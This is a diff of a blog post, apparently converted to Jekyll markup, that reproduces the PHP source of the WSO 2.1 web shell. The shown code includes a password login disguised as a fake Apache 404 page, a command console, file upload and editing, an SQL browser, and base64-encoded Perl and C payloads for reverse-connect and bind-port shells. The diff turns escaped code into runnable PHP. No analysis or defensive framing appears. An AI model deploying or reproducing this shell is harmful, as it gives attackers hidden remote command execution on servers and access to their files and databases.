 &lt;a href="http://www.devilscafe.in" target="_blank"&gt;&lt;img src="http://images.cooltext.com/1380134.gif" /&gt;&lt;/a&gt;&lt;div id="cot_tl_fixed"&gt;&lt;marquee&gt;Private Shell - (c)oded by Lagipre-dz ~ (e)dited by Minhal Mehdi&lt;/marquee&gt;&lt;/div&gt; 
 www.devilscafe.in &lt;/marquee&gt;&lt;/div&gt;
-</pre>
+{% endhighlight %}
 
 Here&#8217;s another version of the same shell script: WSO 2.1 (by pgems.in this time)
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php 
+{% highlight php %}<?php 
 /* WSO 2.1 (Web Shell by pgems.in) */ 
 /*Subhashdasyam.com*/
 $auth_pass = "36028fcd4abb97e9e4f47d929ddc9980"; 
@@ -1462,11 +1462,11 @@ if( get_magic_quotes_gpc() ) {
     $_POST = stripslashes_array($_POST); 
 } 
 function printLogin() { 
-    ?&gt; 
+    ?> 
 &lt;h1&gt;Not Found&lt;/h1&gt; 
 &lt;p&gt;The requested URL was not found on this server.&lt;/p&gt; 
 &lt;hr&gt; 
-&lt;address&gt;Apache Server at &lt;?=$_SERVER['HTTP_HOST']?&gt; Port 80&lt;/address&gt; 
+&lt;address&gt;Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80&lt;/address&gt; 
     &lt;style&gt; 
         input { margin:0;background-color:#fff;border:1px solid #fff; } 
     &lt;/style&gt; 
@@ -1474,7 +1474,7 @@ function printLogin() {
     &lt;form method=post&gt; 
     &lt;input type=password name=pass&gt; 
     &lt;/form&gt;&lt;/center&gt; 
-    &lt;?php 
+    <?php 
     exit; 
 } 
 if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
@@ -1567,20 +1567,20 @@ function printHeader() {
     if(empty($_POST['charset'])) 
         $_POST['charset'] = "UTF-8"; 
     global $color; 
-    ?&gt; 
-&lt;html&gt;&lt;head&gt;&lt;meta http-equiv='Content-Type' content='text/html; charset=&lt;?=$_POST['charset']?&gt;'&gt;&lt;title&gt;&lt;?=$_SERVER['HTTP_HOST']?&gt;- 404 Not Found Shell V.&lt;?=VERSION?&gt;-SubhashDasyam.com&lt;/title&gt; 
+    ?> 
+&lt;html&gt;&lt;head&gt;&lt;meta http-equiv='Content-Type' content='text/html; charset=<?=$_POST['charset']?>'&gt;&lt;title&gt;<?=$_SERVER['HTTP_HOST']?>- 404 Not Found Shell V.<?=VERSION?>-SubhashDasyam.com&lt;/title&gt; 
 &lt;style&gt; 
     body {background-color:#000;color:#fff;} 
     body,td,th    { font: 9pt Lucida,Verdana;margin:0;vertical-align:top; } 
-    span,h1,a    { color:&lt;?=$color?&gt; !important; } 
+    span,h1,a    { color:<?=$color?> !important; } 
     span        { font-weight: bolder; } 
-    h1            { border:1px solid &lt;?=$color?&gt;;padding: 2px 5px;font: 14pt Verdana;margin:0px; } 
+    h1            { border:1px solid <?=$color?>;padding: 2px 5px;font: 14pt Verdana;margin:0px; } 
     div.content    { padding: 5px;margin-left:5px;} 
     a            { text-decoration:none; } 
     a:hover        { background:#ff0000; } 
     .ml1        { border:1px solid #444;padding:5px;margin:0;overflow: auto; } 
     .bigarea    { width:100%;height:250px; } 
-    input, textarea, select    { margin:0;color:#00ff00;background-color:#000;border:1px solid &lt;?=$color?&gt;; font: 9pt Monospace,"Courier New"; } 
+    input, textarea, select    { margin:0;color:#00ff00;background-color:#000;border:1px solid <?=$color?>; font: 9pt Monospace,"Courier New"; } 
     form        { margin:0px; } 
     #toolsTbl    { text-align:center; } 
     .toolsInp    { width: 80%; } 
@@ -1608,7 +1608,7 @@ function printHeader() {
         var params = "ajax=true"; 
         for(i=0;i&lt;document.mf.elements.length;i++) 
             params += "&"+document.mf.elements[i].name+"="+encodeURIComponent(document.mf.elements[i].value); 
-        sr('&lt;?=$_SERVER['REQUEST_URI'];?&gt;', params); 
+        sr('<?=$_SERVER['REQUEST_URI'];?>', params); 
     } 
     function sr(url, params) {     
         if (window.XMLHttpRequest) { 
@@ -1641,14 +1641,14 @@ function printHeader() {
 &lt;/script&gt; 
 &lt;head&gt;&lt;body&gt;&lt;div style="position:absolute;width:100%;top:0;left:0;"&gt; 
 &lt;form method=post name=mf style='display:none;'&gt; 
-&lt;input type=hidden name=a value='&lt;?=isset($_POST['a'])?$_POST['a']:''?&gt;'&gt; 
-&lt;input type=hidden name=c value='&lt;?=htmlspecialchars($GLOBALS['cwd'])?&gt;'&gt; 
-&lt;input type=hidden name=p1 value='&lt;?=isset($_POST['p1'])?htmlspecialchars($_POST['p1']):''?&gt;'&gt; 
-&lt;input type=hidden name=p2 value='&lt;?=isset($_POST['p2'])?htmlspecialchars($_POST['p2']):''?&gt;'&gt; 
-&lt;input type=hidden name=p3 value='&lt;?=isset($_POST['p3'])?htmlspecialchars($_POST['p3']):''?&gt;'&gt; 
-&lt;input type=hidden name=charset value='&lt;?=isset($_POST['charset'])?$_POST['charset']:''?&gt;'&gt; 
+&lt;input type=hidden name=a value='<?=isset($_POST['a'])?$_POST['a']:''?>'&gt; 
+&lt;input type=hidden name=c value='<?=htmlspecialchars($GLOBALS['cwd'])?>'&gt; 
+&lt;input type=hidden name=p1 value='<?=isset($_POST['p1'])?htmlspecialchars($_POST['p1']):''?>'&gt; 
+&lt;input type=hidden name=p2 value='<?=isset($_POST['p2'])?htmlspecialchars($_POST['p2']):''?>'&gt; 
+&lt;input type=hidden name=p3 value='<?=isset($_POST['p3'])?htmlspecialchars($_POST['p3']):''?>'&gt; 
+&lt;input type=hidden name=charset value='<?=isset($_POST['charset'])?$_POST['charset']:''?>'&gt; 
 &lt;/form&gt; 
-&lt;?php 
+<?php 
     $freeSpace = @diskfreespace($GLOBALS['cwd']); 
     $totalSpace = @disk_total_space($GLOBALS['cwd']); 
     $totalSpace = $totalSpace?$totalSpace:1; 
@@ -1699,38 +1699,38 @@ function printHeader() {
             $drives .= '&lt;a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')"&gt;[ '.$drive.' ]&lt;/a&gt; '; 
     } 
     echo '&lt;table class=info cellpadding=3 cellspacing=0 width=100%&gt;&lt;tr&gt;&lt;td width=1&gt;&lt;span&gt;Uname&lt;br&gt;User&lt;br&gt;Php&lt;br&gt;Hdd&lt;br&gt;Cwd'.($GLOBALS['os'] == 'win'?'&lt;br&gt;Drives':'').'&lt;/span&gt;&lt;/td&gt;'. 
-         '&lt;td&gt;:&lt;nobr&gt;'.substr(@php_uname(), 0, 120).'  &lt;a href="http://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank"&gt;[Google]&lt;/a&gt; &lt;a href="'.$millink.'" target=_blank&gt;[milw0rm]&lt;/a&gt;&lt;/nobr&gt;&lt;br&gt;:'.$uid.' ( '.$user.' ) &lt;span&gt;Group:&lt;/span&gt; '.$gid.' ( '.$group.' )&lt;br&gt;:'.@phpversion().' &lt;span&gt;Safe mode:&lt;/span&gt; '.($GLOBALS['safe_mode']?'&lt;font color=red&gt;ON&lt;/font&gt;':'&lt;font color=&lt;?=$color?&gt;&lt;b&gt;OFF&lt;/b&gt;&lt;/font&gt;').' &lt;a href=# onclick="g(\'Php\',null,null,\'info\')"&gt;[ phpinfo ]&lt;/a&gt; &lt;span&gt;Datetime:&lt;/span&gt; '.date('Y-m-d H:i:s').'&lt;br&gt;:'.viewSize($totalSpace).' &lt;span&gt;Free:&lt;/span&gt; '.viewSize($freeSpace).' ('.(int)($freeSpace/$totalSpace*100).'%)&lt;br&gt;:'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' &lt;a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')"&gt;[ home ]&lt;/a&gt;&lt;br&gt;:'.$drives.'&lt;/td&gt;'. 
+         '&lt;td&gt;:&lt;nobr&gt;'.substr(@php_uname(), 0, 120).'  &lt;a href="http://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank"&gt;[Google]&lt;/a&gt; &lt;a href="'.$millink.'" target=_blank&gt;[milw0rm]&lt;/a&gt;&lt;/nobr&gt;&lt;br&gt;:'.$uid.' ( '.$user.' ) &lt;span&gt;Group:&lt;/span&gt; '.$gid.' ( '.$group.' )&lt;br&gt;:'.@phpversion().' &lt;span&gt;Safe mode:&lt;/span&gt; '.($GLOBALS['safe_mode']?'&lt;font color=red&gt;ON&lt;/font&gt;':'&lt;font color=<?=$color?>&lt;b&gt;OFF&lt;/b&gt;&lt;/font&gt;').' &lt;a href=# onclick="g(\'Php\',null,null,\'info\')"&gt;[ phpinfo ]&lt;/a&gt; &lt;span&gt;Datetime:&lt;/span&gt; '.date('Y-m-d H:i:s').'&lt;br&gt;:'.viewSize($totalSpace).' &lt;span&gt;Free:&lt;/span&gt; '.viewSize($freeSpace).' ('.(int)($freeSpace/$totalSpace*100).'%)&lt;br&gt;:'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' &lt;a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')"&gt;[ home ]&lt;/a&gt;&lt;br&gt;:'.$drives.'&lt;/td&gt;'. 
          '&lt;td width=1 align=right&gt;&lt;nobr&gt;&lt;select onchange="g(null,null,null,null,null,this.value)"&gt;&lt;optgroup label="Page charset"&gt;'.$opt_charsets.'&lt;/optgroup&gt;&lt;/select&gt;&lt;br&gt;&lt;span&gt;Server IP:&lt;/span&gt;&lt;br&gt;'.gethostbyname($_SERVER["HTTP_HOST"]).'&lt;br&gt;&lt;span&gt;Client IP:&lt;/span&gt;&lt;br&gt;'.$_SERVER['REMOTE_ADDR'].'&lt;/nobr&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;'. 
          '&lt;table cellpadding=3 cellspacing=0 width=100%&gt;&lt;tr&gt;'.$menu.'&lt;/tr&gt;&lt;/table&gt;&lt;div style="margin:5"&gt;'; 
 } 
 
 function printFooter() { 
     $is_writable = is_writable($GLOBALS['cwd'])?"&lt;font color=green&gt;[ Writeable ]&lt;/font&gt;":"&lt;font color=red&gt;[ Not writable ]&lt;/font&gt;"; 
-?&gt; 
+?> 
 &lt;/div&gt; 
 &lt;table class=info id=toolsTbl cellpadding=0 cellspacing=0 width=100%"&gt; 
     &lt;tr&gt; 
-        &lt;td&gt;&lt;form onsubmit="g(null,this.c.value);return false;"&gt;&lt;span&gt;Change dir:&lt;/span&gt;&lt;br&gt;&lt;input class="toolsInp" type=text name=c value="&lt;?=htmlspecialchars($GLOBALS['cwd']);?&gt;"&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;/td&gt; 
+        &lt;td&gt;&lt;form onsubmit="g(null,this.c.value);return false;"&gt;&lt;span&gt;Change dir:&lt;/span&gt;&lt;br&gt;&lt;input class="toolsInp" type=text name=c value="<?=htmlspecialchars($GLOBALS['cwd']);?>"&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;/td&gt; 
         &lt;td&gt;&lt;form onsubmit="g('FilesTools',null,this.f.value);return false;"&gt;&lt;span&gt;Read file:&lt;/span&gt;&lt;br&gt;&lt;input class="toolsInp" type=text name=f&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;/td&gt; 
     &lt;/tr&gt; 
     &lt;tr&gt; 
-        &lt;td&gt;&lt;form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"&gt;&lt;span&gt;Make dir:&lt;/span&gt;&lt;br&gt;&lt;input class="toolsInp" type=text name=d&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;?=$is_writable?&gt;&lt;/td&gt; 
-        &lt;td&gt;&lt;form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"&gt;&lt;span&gt;Make file:&lt;/span&gt;&lt;br&gt;&lt;input class="toolsInp" type=text name=f&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;?=$is_writable?&gt;&lt;/td&gt; 
+        &lt;td&gt;&lt;form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"&gt;&lt;span&gt;Make dir:&lt;/span&gt;&lt;br&gt;&lt;input class="toolsInp" type=text name=d&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;<?=$is_writable?>&lt;/td&gt; 
+        &lt;td&gt;&lt;form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"&gt;&lt;span&gt;Make file:&lt;/span&gt;&lt;br&gt;&lt;input class="toolsInp" type=text name=f&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;<?=$is_writable?>&lt;/td&gt; 
     &lt;/tr&gt; 
     &lt;tr&gt; 
         &lt;td&gt;&lt;form onsubmit="g('Console',null,this.c.value);return false;"&gt;&lt;span&gt;Execute:&lt;/span&gt;&lt;br&gt;&lt;input class="toolsInp" type=text name=c value=""&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;/td&gt; 
         &lt;td&gt;&lt;form method='post' ENCTYPE='multipart/form-data'&gt; 
         &lt;input type=hidden name=a value='FilesMAn'&gt; 
-        &lt;input type=hidden name=c value='&lt;?=htmlspecialchars($GLOBALS['cwd'])?&gt;'&gt; 
+        &lt;input type=hidden name=c value='<?=htmlspecialchars($GLOBALS['cwd'])?>'&gt; 
         &lt;input type=hidden name=p1 value='uploadFile'&gt; 
-        &lt;input type=hidden name=charset value='&lt;?=isset($_POST['charset'])?$_POST['charset']:''?&gt;'&gt; 
-        &lt;span&gt;Upload file:&lt;/span&gt;&lt;br&gt;&lt;input class="toolsInp" type=file name=f&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;?=$is_writable?&gt;&lt;/td&gt; 
+        &lt;input type=hidden name=charset value='<?=isset($_POST['charset'])?$_POST['charset']:''?>'&gt; 
+        &lt;span&gt;Upload file:&lt;/span&gt;&lt;br&gt;&lt;input class="toolsInp" type=file name=f&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;<?=$is_writable?>&lt;/td&gt; 
     &lt;/tr&gt; 
 
 &lt;/table&gt; 
 &lt;/div&gt; 
 &lt;/body&gt;&lt;/html&gt; 
-&lt;?php 
+<?php 
 } 
 if ( !function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false) ) { function posix_getpwuid($p) { return false; } }
 if ( !function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false) ) { function posix_getgrgid($p) { return false; } }
@@ -2009,7 +2009,7 @@ function actionFilesMan() {
         if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match)) 
             $sort = array($match[1], (int)$match[2]); 
     } 
-?&gt; 
+?> 
 &lt;script&gt; 
     function sa() { 
         for(i=0;i&lt;document.files.elements.length;i++) 
@@ -2019,7 +2019,7 @@ function actionFilesMan() {
 &lt;/script&gt; 
 &lt;table width='100%' class='main' cellspacing='0' cellpadding='2'&gt; 
 &lt;form name=files method=post&gt; 
-&lt;?php 
+<?php 
     echo "&lt;tr&gt;&lt;th width='13px'&gt;&lt;input type=checkbox onclick='sa()' class=chkbx&gt;&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'&gt;Modify&lt;/a&gt;&lt;/th&gt;&lt;th&gt;Owner/Group&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'&gt;Permissions&lt;/a&gt;&lt;/th&gt;&lt;th&gt;Actions&lt;/th&gt;&lt;/tr&gt;"; 
     $dirs = $files = $links = array(); 
     $n = count($dirContent); 
@@ -2058,14 +2058,14 @@ function actionFilesMan() {
             .'&lt;/td&gt;&lt;td&gt;&lt;a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')"&gt;R&lt;/a&gt; &lt;a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')"&gt;T&lt;/a&gt;'.(($f['type']=='file')?' &lt;a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')"&gt;E&lt;/a&gt; &lt;a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')"&gt;D&lt;/a&gt;':'').'&lt;/td&gt;&lt;/tr&gt;'; 
         $l = $l?0:1; 
     } 
-    ?&gt; 
+    ?> 
     &lt;tr&gt;&lt;td colspan=7&gt; 
     &lt;input type=hidden name=a value='FilesMan'&gt; 
-    &lt;input type=hidden name=c value='&lt;?=htmlspecialchars($GLOBALS['cwd'])?&gt;'&gt; 
-    &lt;input type=hidden name=charset value='&lt;?=isset($_POST['charset'])?$_POST['charset']:''?&gt;'&gt; 
-    &lt;select name='p1'&gt;&lt;option value='copy'&gt;Copy&lt;/option&gt;&lt;option value='move'&gt;Move&lt;/option&gt;&lt;option value='delete'&gt;Delete&lt;/option&gt;&lt;?php if(!empty($_SESSION['act'])&&@count($_SESSION['f'])){?&gt;&lt;option value='paste'&gt;Paste&lt;/option&gt;&lt;?php }?&gt;&lt;/select&gt;&nbsp;&lt;input type="submit" value="&gt;&gt;"&gt;&lt;/td&gt;&lt;/tr&gt; 
+    &lt;input type=hidden name=c value='<?=htmlspecialchars($GLOBALS['cwd'])?>'&gt; 
+    &lt;input type=hidden name=charset value='<?=isset($_POST['charset'])?$_POST['charset']:''?>'&gt; 
+    &lt;select name='p1'&gt;&lt;option value='copy'&gt;Copy&lt;/option&gt;&lt;option value='move'&gt;Move&lt;/option&gt;&lt;option value='delete'&gt;Delete&lt;/option&gt;<?php if(!empty($_SESSION['act'])&&@count($_SESSION['f'])){?>&lt;option value='paste'&gt;Paste&lt;/option&gt;<?php }?>&lt;/select&gt;&nbsp;&lt;input type="submit" value="&gt;&gt;"&gt;&lt;/td&gt;&lt;/tr&gt; 
     &lt;/form&gt;&lt;/table&gt;&lt;/div&gt; 
-    &lt;?php 
+    <?php 
     printFooter(); 
 } 
 
@@ -2120,7 +2120,7 @@ function actionStringTools() {
         echo htmlspecialchars($_POST['p1']($_POST['p2'])); 
     } 
     echo"&lt;/pre&gt;&lt;/div&gt;"; 
-    ?&gt; 
+    ?> 
     &lt;br&gt;&lt;h1&gt;Search for hash:&lt;/h1&gt;&lt;div class=content&gt; 
         &lt;form method='post' target='_blank' name="hf"&gt; 
             &lt;input type="text" name="hash" style="width:200px;"&gt;&lt;br&gt; 
@@ -2131,7 +2131,7 @@ function actionStringTools() {
             &lt;input type="button" value="md5decrypter.com" onclick="document.hf.action='http://www.md5decrypter.com/';document.hf.submit()"&gt;&lt;br&gt; 
         &lt;/form&gt; 
     &lt;/div&gt; 
-    &lt;?php 
+    <?php 
     printFooter(); 
 } 
 
@@ -2360,7 +2360,7 @@ function actionConsole() {
         exit; 
     } 
     printHeader(); 
-?&gt; 
+?> 
 &lt;script&gt; 
 if(window.Event) window.captureEvents(Event.KEYDOWN); 
 var cmds = new Array(""); 
@@ -2388,7 +2388,7 @@ function add(cmd) {
     cur = cmds.length-1; 
 } 
 &lt;/script&gt; 
-&lt;?php 
+<?php 
     echo '&lt;h1&gt;Console&lt;/h1&gt;&lt;div class=content&gt;&lt;form name=cf onsubmit="if(document.cf.cmd.value==\'clear\'){document.cf.output.value=\'\';document.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value);}else{g(null,null,this.cmd.value);} return false;"&gt;&lt;select name=alias&gt;'; 
     foreach($GLOBALS['aliases'] as $n =&gt; $v) { 
         if($v == '') { 
@@ -2651,7 +2651,7 @@ function actionSql() {
         exit; 
     } 
     printHeader(); 
-    ?&gt; 
+    ?> 
     &lt;h1&gt;Sql browser&lt;/h1&gt;&lt;div class=content&gt; 
     &lt;form name="sf" method="post"&gt; 
         &lt;table cellpadding="2" cellspacing="0"&gt; 
@@ -2667,18 +2667,18 @@ function actionSql() {
                 &lt;input type=hidden name=a value=Sql&gt; 
                 &lt;input type=hidden name=p1 value='query'&gt; 
                 &lt;input type=hidden name=p2&gt; 
-                &lt;input type=hidden name=c value='&lt;?=htmlspecialchars($GLOBALS['cwd']);?&gt;'&gt; 
-                &lt;input type=hidden name=charset value='&lt;?=isset($_POST['charset'])?$_POST['charset']:''?&gt;'&gt; 
+                &lt;input type=hidden name=c value='<?=htmlspecialchars($GLOBALS['cwd']);?>'&gt; 
+                &lt;input type=hidden name=charset value='<?=isset($_POST['charset'])?$_POST['charset']:''?>'&gt; 
                 &lt;td&gt; 
                     &lt;select name='type'&gt; 
-                        &lt;option value="mysql" &lt;?php if(@$_POST['type']=='mysql')echo 'selected';?&gt;&gt;MySql&lt;/option&gt; 
-                        &lt;option value="pgsql" &lt;?php if(@$_POST['type']=='pgsql')echo 'selected';?&gt;&gt;PostgreSql&lt;/option&gt; 
+                        &lt;option value="mysql" <?php if(@$_POST['type']=='mysql')echo 'selected';?>&gt;MySql&lt;/option&gt; 
+                        &lt;option value="pgsql" <?php if(@$_POST['type']=='pgsql')echo 'selected';?>&gt;PostgreSql&lt;/option&gt; 
                     &lt;/select&gt;&lt;/td&gt; 
-                &lt;td&gt;&lt;input type=text name=sql_host value='&lt;?=(empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host']));?&gt;'&gt;&lt;/td&gt; 
-                &lt;td&gt;&lt;input type=text name=sql_login value='&lt;?=(empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login']));?&gt;'&gt;&lt;/td&gt; 
-                &lt;td&gt;&lt;input type=text name=sql_pass value='&lt;?=(empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass']));?&gt;'&gt;&lt;/td&gt; 
+                &lt;td&gt;&lt;input type=text name=sql_host value='<?=(empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host']));?>'&gt;&lt;/td&gt; 
+                &lt;td&gt;&lt;input type=text name=sql_login value='<?=(empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login']));?>'&gt;&lt;/td&gt; 
+                &lt;td&gt;&lt;input type=text name=sql_pass value='<?=(empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass']));?>'&gt;&lt;/td&gt; 
                 &lt;td&gt; 
-    &lt;?php 
+    <?php 
     $tmp = "&lt;input type=text name=sql_base value=''&gt;"; 
     if(isset($_POST['sql_host'])){ 
         if($db-&gt;connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) { 
@@ -2700,7 +2700,7 @@ function actionSql() {
         else echo $tmp; 
     }else 
         echo $tmp; 
-    ?&gt;&lt;/td&gt; 
+    ?>&lt;/td&gt; 
                 &lt;td&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/td&gt; 
             &lt;/tr&gt; 
         &lt;/table&gt; 
@@ -2716,7 +2716,7 @@ function actionSql() {
                     document.sf.elements['tbl[]'][i].checked = !document.sf.elements['tbl[]'][i].checked; 
             } 
         &lt;/script&gt; 
-    &lt;?php 
+    <?php 
     if(isset($db) && $db-&gt;link){ 
         echo "&lt;br/&gt;&lt;table width=100% cellpadding=2 cellspacing=0&gt;"; 
             if(!empty($_POST['sql_base'])){ 
@@ -2797,7 +2797,7 @@ function actionNetwork() {
     $back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7"; 
     $bind_port_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikgew0KICAgIGludCBzLGMsaTsNCiAgICBjaGFyIHBbMzBdOw0KICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByOw0KICAgIGRhZW1vbigxLDApOw0KICAgIHMgPSBzb2NrZXQoQUZfSU5FVCxTT0NLX1NUUkVBTSwwKTsNCiAgICBpZighcykgcmV0dXJuIC0xOw0KICAgIHIuc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgci5zaW5fcG9ydCA9IGh0b25zKGF0b2koYXJndlsxXSkpOw0KICAgIHIuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7DQogICAgYmluZChzLCAoc3RydWN0IHNvY2thZGRyICopJnIsIDB4MTApOw0KICAgIGxpc3RlbihzLCA1KTsNCiAgICB3aGlsZSgxKSB7DQogICAgICAgIGM9YWNjZXB0KHMsMCwwKTsNCiAgICAgICAgZHVwMihjLDApOw0KICAgICAgICBkdXAyKGMsMSk7DQogICAgICAgIGR1cDIoYywyKTsNCiAgICAgICAgd3JpdGUoYywiUGFzc3dvcmQ6Iiw5KTsNCiAgICAgICAgcmVhZChjLHAsc2l6ZW9mKHApKTsNCiAgICAgICAgZm9yKGk9MDtpPHN0cmxlbihwKTtpKyspDQogICAgICAgICAgICBpZiggKHBbaV0gPT0gJ1xuJykgfHwgKHBbaV0gPT0gJ1xyJykgKQ0KICAgICAgICAgICAgICAgIHBbaV0gPSAnXDAnOw0KICAgICAgICBpZiAoc3RyY21wKGFyZ3ZbMl0scCkgPT0gMCkNCiAgICAgICAgICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgICAgICBjbG9zZShjKTsNCiAgICB9DQp9"; 
     $bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0="; 
-    ?&gt; 
+    ?> 
     &lt;h1&gt;Network tools&lt;/h1&gt;&lt;div class=content&gt; 
     &lt;form name='nfp' onSubmit="g(null,null,this.using.value,this.port.value,this.pass.value);return false;"&gt; 
     &lt;span&gt;Bind port to /bin/sh&lt;/span&gt;&lt;br/&gt; 
@@ -2805,9 +2805,9 @@ function actionNetwork() {
     &lt;/form&gt; 
     &lt;form name='nfp' onSubmit="g(null,null,this.using.value,this.server.value,this.port.value);return false;"&gt; 
     &lt;span&gt;Back-connect to&lt;/span&gt;&lt;br/&gt; 
-    Server: &lt;input type='text' name='server' value='&lt;?=$_SERVER['REMOTE_ADDR']?&gt;'&gt; Port: &lt;input type='text' name='port' value='31337'&gt; Using: &lt;select name="using"&gt;&lt;option value='bcc'&gt;C&lt;/option&gt;&lt;option value='bcp'&gt;Perl&lt;/option&gt;&lt;/select&gt; &lt;input type=submit value="&gt;&gt;"&gt; 
+    Server: &lt;input type='text' name='server' value='<?=$_SERVER['REMOTE_ADDR']?>'&gt; Port: &lt;input type='text' name='port' value='31337'&gt; Using: &lt;select name="using"&gt;&lt;option value='bcc'&gt;C&lt;/option&gt;&lt;option value='bcp'&gt;Perl&lt;/option&gt;&lt;/select&gt; &lt;input type=submit value="&gt;&gt;"&gt; 
     &lt;/form&gt;&lt;br&gt; 
-    &lt;?php 
+    <?php 
     if(isset($_POST['p1'])) { 
         function cf($f,$t) { 
